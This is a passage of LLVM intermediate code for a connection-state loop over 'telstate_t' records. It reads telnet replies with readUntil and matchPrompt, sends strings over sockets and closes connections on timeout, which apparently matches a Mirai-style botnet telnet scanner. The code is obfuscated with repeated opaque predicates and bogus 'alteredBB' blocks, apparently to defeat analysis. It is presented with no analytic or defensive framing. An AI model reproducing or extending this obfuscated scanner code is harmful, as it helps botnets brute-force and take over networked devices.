  %2628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2627, i32 0, i32 8
  %2629 = load i8*, i8** %2628, align 8
  call void @llvm.memset.p0i8.i64(i8* %2629, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2630:                                   ; preds = %originalBBpart2222
  %2631 = load i32, i32* %2, align 4
  %2632 = sext i32 %2631 to i64
  %2633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2632
  %2634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2633, i32 0, i32 0
  %2635 = load i32, i32* %2634, align 16
  %2636 = load i32, i32* %2, align 4
  %2637 = sext i32 %2636 to i64
  %2638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2637
  %2639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2638, i32 0, i32 8
  %2640 = load i8*, i8** %2639, align 8
  %2641 = load i32, i32* %2, align 4
  %2642 = sext i32 %2641 to i64
  %2643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2642
  %2644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2643, i32 0, i32 7
  %2645 = load i16, i16* %2644, align 16
  %2646 = zext i16 %2645 to i32
  %2647 = call i32 @readUntil(i32 %2635, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2640, i32 1024, i32 %2646)
  %2648 = icmp ne i32 %2647, 0
  br i1 %2648, label %2649, label %2740

; <label>:2649:                                   ; preds = %2630
  %2650 = load i32, i32* @x.63
  %2651 = load i32, i32* @y.64
  %2652 = sub i32 %2650, 1
  %2653 = mul i32 %2650, %2652
  %2654 = urem i32 %2653, 2
  %2655 = icmp eq i32 %2654, 0
  %2656 = icmp slt i32 %2651, 10
  %2657 = or i1 %2655, %2656
  br i1 %2657, label %originalBB224, label %originalBB224alteredBB

originalBB224:                                    ; preds = %originalBB224alteredBB, %2649
  %2658 = load i32, i32* %2, align 4
  %2659 = sext i32 %2658 to i64
  %2660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2659
  %2661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2660, i32 0, i32 6
  store i32 0, i32* %2661, align 4
  %2662 = load i32, i32* %2, align 4
  %2663 = sext i32 %2662 to i64
  %2664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2663
  %2665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2664, i32 0, i32 7
  store i16 0, i16* %2665, align 16
  %2666 = load i32, i32* %2, align 4
  %2667 = sext i32 %2666 to i64
  %2668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2667
  %2669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2668, i32 0, i32 8
  %2670 = load i8*, i8** %2669, align 8
  %2671 = call i8* @strstr(i8* %2670, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %2672 = icmp ne i8* %2671, null
  %2673 = load i32, i32* @x.63
  %2674 = load i32, i32* @y.64
  %2675 = sub i32 %2673, 1
  %2676 = mul i32 %2673, %2675
  %2677 = urem i32 %2676, 2
  %2678 = icmp eq i32 %2677, 0
  %2679 = icmp slt i32 %2674, 10
  %2680 = or i1 %2678, %2679
  br i1 %2680, label %originalBBpart2226, label %originalBB224alteredBB

originalBBpart2226:                               ; preds = %originalBB224
  br i1 %2672, label %2681, label %2701

; <label>:2681:                                   ; preds = %originalBBpart2226
  %2682 = load i32, i32* %2, align 4
  %2683 = sext i32 %2682 to i64
  %2684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2683
  %2685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2684, i32 0, i32 8
  %2686 = load i8*, i8** %2685, align 8
  call void @llvm.memset.p0i8.i64(i8* %2686, i8 0, i64 1024, i32 1, i1 false)
  %2687 = load i32, i32* %2, align 4
  %2688 = sext i32 %2687 to i64
  %2689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2688
  %2690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2689, i32 0, i32 0
  %2691 = load i32, i32* %2690, align 16
  %2692 = call i32 @sclose(i32 %2691)
  %2693 = load i32, i32* %2, align 4
  %2694 = sext i32 %2693 to i64
  %2695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2694
  %2696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2695, i32 0, i32 2
  store i8 0, i8* %2696, align 8
  %2697 = load i32, i32* %2, align 4
  %2698 = sext i32 %2697 to i64
  %2699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2698
  %2700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2699, i32 0, i32 3
  store i8 0, i8* %2700, align 1
  br label %2959

; <label>:2701:                                   ; preds = %originalBBpart2226
  %2702 = load i32, i32* %2, align 4
  %2703 = sext i32 %2702 to i64
  %2704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2703
  %2705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2704, i32 0, i32 8
  %2706 = load i8*, i8** %2705, align 8
  %2707 = call i32 @matchPrompt(i8* %2706)
  %2708 = icmp ne i32 %2707, 0
  br i1 %2708, label %2729, label %2709

; <label>:2709:                                   ; preds = %2701
  %2710 = load i32, i32* %2, align 4
  %2711 = sext i32 %2710 to i64
  %2712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2711
  %2713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2712, i32 0, i32 8
  %2714 = load i8*, i8** %2713, align 8
  call void @llvm.memset.p0i8.i64(i8* %2714, i8 0, i64 1024, i32 1, i1 false)
  %2715 = load i32, i32* %2, align 4
  %2716 = sext i32 %2715 to i64
  %2717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2716
  %2718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2717, i32 0, i32 0
  %2719 = load i32, i32* %2718, align 16
  %2720 = call i32 @sclose(i32 %2719)
  %2721 = load i32, i32* %2, align 4
  %2722 = sext i32 %2721 to i64
  %2723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2722
  %2724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2723, i32 0, i32 2
  store i8 0, i8* %2724, align 8
  %2725 = load i32, i32* %2, align 4
  %2726 = sext i32 %2725 to i64
  %2727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2726
  %2728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2727, i32 0, i32 3
  store i8 1, i8* %2728, align 1
  br label %2959

; <label>:2729:                                   ; preds = %2701
  %2730 = load i32, i32* %2, align 4
  %2731 = sext i32 %2730 to i64
  %2732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2731
  %2733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2732, i32 0, i32 2
  store i8 7, i8* %2733, align 8
  br label %2734

; <label>:2734:                                   ; preds = %2729
  %2735 = load i32, i32* %2, align 4
  %2736 = sext i32 %2735 to i64
  %2737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2736
  %2738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2737, i32 0, i32 8
  %2739 = load i8*, i8** %2738, align 8
  call void @llvm.memset.p0i8.i64(i8* %2739, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2740:                                   ; preds = %2630
  %2741 = load i32, i32* %2, align 4
  %2742 = sext i32 %2741 to i64
  %2743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2742
  %2744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2743, i32 0, i32 8
  %2745 = load i8*, i8** %2744, align 8
  %2746 = call i64 @strlen(i8* %2745) #10
  %2747 = trunc i64 %2746 to i16
  %2748 = load i32, i32* %2, align 4
  %2749 = sext i32 %2748 to i64
  %2750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2749
  %2751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2750, i32 0, i32 7
  store i16 %2747, i16* %2751, align 16
  br label %2752

; <label>:2752:                                   ; preds = %2740
  br label %2753

; <label>:2753:                                   ; preds = %2752
  br label %2754

; <label>:2754:                                   ; preds = %2753
  br label %2755

; <label>:2755:                                   ; preds = %2754
  %2756 = load i32, i32* @x.63
  %2757 = load i32, i32* @y.64
  %2758 = sub i32 %2756, 1
  %2759 = mul i32 %2756, %2758
  %2760 = urem i32 %2759, 2
  %2761 = icmp eq i32 %2760, 0
  %2762 = icmp slt i32 %2757, 10
  %2763 = or i1 %2761, %2762
  br i1 %2763, label %originalBB228, label %originalBB228alteredBB

originalBB228:                                    ; preds = %originalBB228alteredBB, %2755
  %2764 = load i32, i32* @x.63
  %2765 = load i32, i32* @y.64
  %2766 = sub i32 %2764, 1
  %2767 = mul i32 %2764, %2766
  %2768 = urem i32 %2767, 2
  %2769 = icmp eq i32 %2768, 0
  %2770 = icmp slt i32 %2765, 10
  %2771 = or i1 %2769, %2770
  br i1 %2771, label %originalBBpart2230, label %originalBB228alteredBB

originalBBpart2230:                               ; preds = %originalBB228
  br label %2772

; <label>:2772:                                   ; preds = %originalBBpart2230
  br label %2773

; <label>:2773:                                   ; preds = %2772
  br label %2774

; <label>:2774:                                   ; preds = %2773
  br label %2775

; <label>:2775:                                   ; preds = %2774
  %2776 = load i32, i32* %2, align 4
  %2777 = sext i32 %2776 to i64
  %2778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2777
  %2779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2778, i32 0, i32 6
  %2780 = load i32, i32* %2779, align 4
  %2781 = add i32 %2780, 10
  %2782 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2783 = icmp ult i32 %2781, %2782
  br i1 %2783, label %2784, label %2815

; <label>:2784:                                   ; preds = %2775
  %2785 = load i32, i32* @x.63
  %2786 = load i32, i32* @y.64
  %2787 = sub i32 %2785, 1
  %2788 = mul i32 %2785, %2787
  %2789 = urem i32 %2788, 2
  %2790 = icmp eq i32 %2789, 0
  %2791 = icmp slt i32 %2786, 10
  %2792 = or i1 %2790, %2791
  br i1 %2792, label %originalBB232, label %originalBB232alteredBB

originalBB232:                                    ; preds = %originalBB232alteredBB, %2784
  %2793 = load i32, i32* %2, align 4
  %2794 = sext i32 %2793 to i64
  %2795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2794
  %2796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2795, i32 0, i32 0
  %2797 = load i32, i32* %2796, align 16
  %2798 = call i32 @sclose(i32 %2797)
  %2799 = load i32, i32* %2, align 4
  %2800 = sext i32 %2799 to i64
  %2801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2800
  %2802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2801, i32 0, i32 2
  store i8 0, i8* %2802, align 8
  %2803 = load i32, i32* %2, align 4
  %2804 = sext i32 %2803 to i64
  %2805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2804
  %2806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2805, i32 0, i32 3
  store i8 1, i8* %2806, align 1
  %2807 = load i32, i32* @x.63
  %2808 = load i32, i32* @y.64
  %2809 = sub i32 %2807, 1
  %2810 = mul i32 %2807, %2809
  %2811 = urem i32 %2810, 2
  %2812 = icmp eq i32 %2811, 0
  %2813 = icmp slt i32 %2808, 10
  %2814 = or i1 %2812, %2813
  br i1 %2814, label %originalBBpart2234, label %originalBB232alteredBB

originalBBpart2234:                               ; preds = %originalBB232
  br label %2815

; <label>:2815:                                   ; preds = %originalBBpart2234, %2775
  br label %2958

; <label>:2816:                                   ; preds = %originalBBpart223
  %2817 = load i32, i32* %2, align 4
  %2818 = sext i32 %2817 to i64
  %2819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2818
  %2820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2819, i32 0, i32 0
  %2821 = load i32, i32* %2820, align 16
  %2822 = call i64 @send(i32 %2821, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %2823 = icmp slt i64 %2822, 0
  br i1 %2823, label %2824, label %2839

; <label>:2824:                                   ; preds = %2816
  %2825 = load i32, i32* %2, align 4
  %2826 = sext i32 %2825 to i64
  %2827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2826
  %2828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2827, i32 0, i32 0
  %2829 = load i32, i32* %2828, align 16
  %2830 = call i32 @sclose(i32 %2829)
  %2831 = load i32, i32* %2, align 4
  %2832 = sext i32 %2831 to i64
  %2833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2832
  %2834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2833, i32 0, i32 2
  store i8 0, i8* %2834, align 8
  %2835 = load i32, i32* %2, align 4
  %2836 = sext i32 %2835 to i64
  %2837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2836
  %2838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2837, i32 0, i32 3
  store i8 1, i8* %2838, align 1
  br label %2959

; <label>:2839:                                   ; preds = %2816
  %2840 = load i32, i32* @x.63
  %2841 = load i32, i32* @y.64
  %2842 = sub i32 %2840, 1
  %2843 = mul i32 %2840, %2842
  %2844 = urem i32 %2843, 2
  %2845 = icmp eq i32 %2844, 0
  %2846 = icmp slt i32 %2841, 10
  %2847 = or i1 %2845, %2846
  br i1 %2847, label %originalBB236, label %originalBB236alteredBB

originalBB236:                                    ; preds = %originalBB236alteredBB, %2839
  %2848 = load i32, i32* %2, align 4
  %2849 = sext i32 %2848 to i64
  %2850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2849
  %2851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2850, i32 0, i32 2
  store i8 8, i8* %2851, align 8
  %2852 = load i32, i32* @x.63
  %2853 = load i32, i32* @y.64
  %2854 = sub i32 %2852, 1
  %2855 = mul i32 %2852, %2854
  %2856 = urem i32 %2855, 2
  %2857 = icmp eq i32 %2856, 0
  %2858 = icmp slt i32 %2853, 10
  %2859 = or i1 %2857, %2858
  br i1 %2859, label %originalBBpart2238, label %originalBB236alteredBB

originalBBpart2238:                               ; preds = %originalBB236
  br label %2958

; <label>:2860:                                   ; preds = %originalBBpart223
  %2861 = load i32, i32* %2, align 4
  %2862 = sext i32 %2861 to i64
  %2863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2862
  %2864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2863, i32 0, i32 6
  %2865 = load i32, i32* %2864, align 4
  %2866 = icmp eq i32 %2865, 0
  br i1 %2866, label %2867, label %2889

; <label>:2867:                                   ; preds = %2860
  %2868 = load i32, i32* @x.63
  %2869 = load i32, i32* @y.64
  %2870 = sub i32 %2868, 1
  %2871 = mul i32 %2868, %2870
  %2872 = urem i32 %2871, 2
  %2873 = icmp eq i32 %2872, 0
  %2874 = icmp slt i32 %2869, 10
  %2875 = or i1 %2873, %2874
  br i1 %2875, label %originalBB240, label %originalBB240alteredBB

originalBB240:                                    ; preds = %originalBB240alteredBB, %2867
  %2876 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2877 = load i32, i32* %2, align 4
  %2878 = sext i32 %2877 to i64
  %2879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2878
  %2880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2879, i32 0, i32 6
  store i32 %2876, i32* %2880, align 4
  %2881 = load i32, i32* @x.63
  %2882 = load i32, i32* @y.64
  %2883 = sub i32 %2881, 1
  %2884 = mul i32 %2881, %2883
  %2885 = urem i32 %2884, 2
  %2886 = icmp eq i32 %2885, 0
  %2887 = icmp slt i32 %2882, 10
  %2888 = or i1 %2886, %2887
  br i1 %2888, label %originalBBpart2242, label %originalBB240alteredBB

originalBBpart2242:                               ; preds = %originalBB240
  br label %2889

; <label>:2889:                                   ; preds = %originalBBpart2242, %2860
  %2890 = load i32, i32* %2, align 4
  %2891 = sext i32 %2890 to i64
  %2892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2891
  %2893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2892, i32 0, i32 0
  %2894 = load i32, i32* %2893, align 16
  %2895 = call i64 @send(i32 %2894, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i32 0, i32 0), i64 194, i32 16384)
  %2896 = icmp slt i64 %2895, 0
  br i1 %2896, label %2897, label %2917

; <label>:2897:                                   ; preds = %2889
  %2898 = load i32, i32* %2, align 4
  %2899 = sext i32 %2898 to i64
  %2900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2899
  %2901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2900, i32 0, i32 0
  %2902 = load i32, i32* %2901, align 16
  %2903 = call i32 @sclose(i32 %2902)
  %2904 = load i32, i32* %2, align 4
  %2905 = sext i32 %2904 to i64
  %2906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2905
  %2907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2906, i32 0, i32 2
  store i8 0, i8* %2907, align 8
  %2908 = load i32, i32* %2, align 4
  %2909 = sext i32 %2908 to i64
  %2910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2909
  %2911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2910, i32 0, i32 3
  store i8 1, i8* %2911, align 1
  %2912 = load i32, i32* %2, align 4
  %2913 = sext i32 %2912 to i64
  %2914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2913
  %2915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2914, i32 0, i32 8
  %2916 = load i8*, i8** %2915, align 8
  call void @llvm.memset.p0i8.i64(i8* %2916, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2917:                                   ; preds = %2889
  %2918 = load i32, i32* %2, align 4
  %2919 = sext i32 %2918 to i64
  %2920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2919
  %2921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2920, i32 0, i32 6
  %2922 = load i32, i32* %2921, align 4
  %2923 = add i32 %2922, 10
  %2924 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2925 = icmp ult i32 %2923, %2924
  br i1 %2925, label %2926, label %2957

; <label>:2926:                                   ; preds = %2917
  %2927 = load i32, i32* @x.63
  %2928 = load i32, i32* @y.64
  %2929 = sub i32 %2927, 1
  %2930 = mul i32 %2927, %2929
  %2931 = urem i32 %2930, 2
  %2932 = icmp eq i32 %2931, 0
  %2933 = icmp slt i32 %2928, 10
  %2934 = or i1 %2932, %2933
  br i1 %2934, label %originalBB244, label %originalBB244alteredBB

originalBB244:                                    ; preds = %originalBB244alteredBB, %2926
  %2935 = load i32, i32* %2, align 4
  %2936 = sext i32 %2935 to i64
  %2937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2936
  %2938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2937, i32 0, i32 0
  %2939 = load i32, i32* %2938, align 16
  %2940 = call i32 @sclose(i32 %2939)
  %2941 = load i32, i32* %2, align 4
  %2942 = sext i32 %2941 to i64
  %2943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2942
  %2944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2943, i32 0, i32 2
  store i8 0, i8* %2944, align 8
  %2945 = load i32, i32* %2, align 4
  %2946 = sext i32 %2945 to i64
  %2947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2946
  %2948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2947, i32 0, i32 3
  store i8 1, i8* %2948, align 1
  %2949 = load i32, i32* @x.63
  %2950 = load i32, i32* @y.64
  %2951 = sub i32 %2949, 1
  %2952 = mul i32 %2949, %2951
  %2953 = urem i32 %2952, 2
  %2954 = icmp eq i32 %2953, 0
  %2955 = icmp slt i32 %2950, 10
  %2956 = or i1 %2954, %2955
  br i1 %2956, label %originalBBpart2246, label %originalBB244alteredBB

originalBBpart2246:                               ; preds = %originalBB244
  br label %2957

; <label>:2957:                                   ; preds = %originalBBpart2246, %2917
  br label %2958

; <label>:2958:                                   ; preds = %2957, %originalBBpart2238, %2815, %1810, %originalBBpart2186, %1126, %1030, %originalBBpart269, %originalBBpart245, %originalBBpart223
  br label %2959

; <label>:2959:                                   ; preds = %2958, %2897, %2824, %2734, %2709, %2681, %2624, %2599, %2571, %2514, %originalBBpart2218, %2445, %2404, %originalBBpart2214, %2335, %2294, %2269, %2241, %2200, %2175, %2147, %originalBBpart2210, %originalBBpart2202, %1989, %1948, %originalBBpart2194, %1879, %1795, %1772, %originalBBpart2153, %1552, %originalBBpart2149, %1490, %1467, %originalBBpart2141, %1373, %1350, %1336, %1253, %1111, %originalBBpart2105, %originalBBpart297, %911, %originalBBpart289, %771, %originalBBpart273, %490, %282, %originalBBpart237
  %2960 = load i32, i32* %2, align 4
  %2961 = add nsw i32 %2960, 1
  store i32 %2961, i32* %2, align 4
  br label %112

; <label>:2962:                                   ; preds = %112
  %2963 = load i32, i32* @x.63
  %2964 = load i32, i32* @y.64
  %2965 = sub i32 %2963, 1
  %2966 = mul i32 %2963, %2965
  %2967 = urem i32 %2966, 2
  %2968 = icmp eq i32 %2967, 0
  %2969 = icmp slt i32 %2964, 10
  %2970 = or i1 %2968, %2969
  br i1 %2970, label %originalBB248, label %originalBB248alteredBB

originalBB248:                                    ; preds = %originalBB248alteredBB, %2962
  %2971 = load i32, i32* @x.63
  %2972 = load i32, i32* @y.64
  %2973 = sub i32 %2971, 1
  %2974 = mul i32 %2971, %2973
  %2975 = urem i32 %2974, 2
  %2976 = icmp eq i32 %2975, 0
  %2977 = icmp slt i32 %2972, 10
  %2978 = or i1 %2976, %2977
  br i1 %2978, label %originalBBpart2250, label %originalBB248alteredBB

originalBBpart2250:                               ; preds = %originalBB248
  br label %110
                                                  ; No predecessors!
  %2980 = load i32, i32* @x.63
  %2981 = load i32, i32* @y.64
  %2982 = sub i32 %2980, 1
  %2983 = mul i32 %2980, %2982
  %2984 = urem i32 %2983, 2
  %2985 = icmp eq i32 %2984, 0
  %2986 = icmp slt i32 %2981, 10
  %2987 = or i1 %2985, %2986
  br i1 %2987, label %originalBB252, label %originalBB252alteredBB

originalBB252:                                    ; preds = %originalBB252alteredBB, %2979
  %2988 = load i32, i32* @x.63
  %2989 = load i32, i32* @y.64
  %2990 = sub i32 %2988, 1
  %2991 = mul i32 %2988, %2990
  %2992 = urem i32 %2991, 2
  %2993 = icmp eq i32 %2992, 0
  %2994 = icmp slt i32 %2989, 10
  %2995 = or i1 %2993, %2994
  br i1 %2995, label %originalBBpart2254, label %originalBB252alteredBB

originalBBpart2254:                               ; preds = %originalBB252
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %20
  %2996 = load i32, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %2997 = load i32, i32* %2, align 4
  %_ = sub i32 %2997, 1
  %gen = mul i32 %_, 1
  %_2 = shl i32 %2997, 1
  %_3 = sub i32 0, %2997
  %gen4 = add i32 %_3, 1
  %_5 = shl i32 %2997, 1
  %_6 = sub i32 %2997, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %2997, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %2997, 1
  %_11 = sub i32 %2997, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %2997, 1
  %2998 = add nsw i32 %2997, 1
  store i32 %2998, i32* %2, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %91
  %2999 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %2999, align 8
  %3000 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %3000, align 8
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %116
  %3001 = load i32, i32* %2, align 4
  %3002 = sext i32 %3001 to i64
  %3003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3002
  %3004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3003, i32 0, i32 2
  %3005 = load i8, i8* %3004, align 8
  %3006 = zext i8 %3005 to i32
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %185
  %3007 = load i32, i32* %2, align 4
  %3008 = sext i32 %3007 to i64
  %3009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3008
  %3010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3009, i32 0, i32 5
  store i8 0, i8* %3010, align 1
  %3011 = load i32, i32* %2, align 4
  %3012 = sext i32 %3011 to i64
  %3013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3012
  %3014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3013, i32 0, i32 4
  %3015 = load i8, i8* %3014, align 2
  %_26 = sub i8 0, %3015
  %gen27 = add i8 %_26, 1
  %3016 = add i8 %3015, 1
  store i8 %3016, i8* %3014, align 2
  br label %originalBB25

originalBB31alteredBB:                            ; preds = %originalBB31, %212
  %3017 = load i32, i32* %2, align 4
  %3018 = sext i32 %3017 to i64
  %3019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3018
  %3020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3019, i32 0, i32 4
  %3021 = load i8, i8* %3020, align 2
  %3022 = zext i8 %3021 to i64
  %3023 = icmp eq i64 %3022, 10
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %236
  %3024 = load i32, i32* %2, align 4
  %3025 = sext i32 %3024 to i64
  %3026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3025
  %3027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3026, i32 0, i32 3
  store i8 1, i8* %3027, align 1
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %309
  %3028 = load i32, i32* %2, align 4
  %3029 = sext i32 %3028 to i64
  %3030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3029
  %3031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3030, i32 0, i32 0
  %3032 = load i32, i32* %3031, align 16
  %3033 = call i32 @sclose(i32 %3032)
  %3034 = load i32, i32* %2, align 4
  %3035 = sext i32 %3034 to i64
  %3036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3035
  %3037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3036, i32 0, i32 3
  store i8 1, i8* %3037, align 1
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %345
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %369
  %3038 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %3039 = load i32, i32* %2, align 4
  %3040 = sext i32 %3039 to i64
  %3041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3040
  %3042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3041, i32 0, i32 6
  store i32 %3038, i32* %3042, align 4
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %401
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %459
  %3043 = load i32, i32* %2, align 4
  %3044 = sext i32 %3043 to i64
  %3045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3044
  %3046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3045, i32 0, i32 0
  %3047 = load i32, i32* %3046, align 16
  %3048 = call i32 @sclose(i32 %3047)
  %3049 = load i32, i32* %2, align 4
  %3050 = sext i32 %3049 to i64
  %3051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3050
  %3052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3051, i32 0, i32 2
  store i8 0, i8* %3052, align 8
  %3053 = load i32, i32* %2, align 4
  %3054 = sext i32 %3053 to i64
  %3055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3054
  %3056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3055, i32 0, i32 3
  store i8 1, i8* %3056, align 1
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %525
  %3057 = load i32, i32* %2, align 4
  %3058 = sext i32 %3057 to i64
  %3059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3058
  %3060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3059, i32 0, i32 0
  %3061 = load i32, i32* %3060, align 16
  %3062 = call i32 @sclose(i32 %3061)
  %3063 = load i32, i32* %2, align 4
  %3064 = sext i32 %3063 to i64
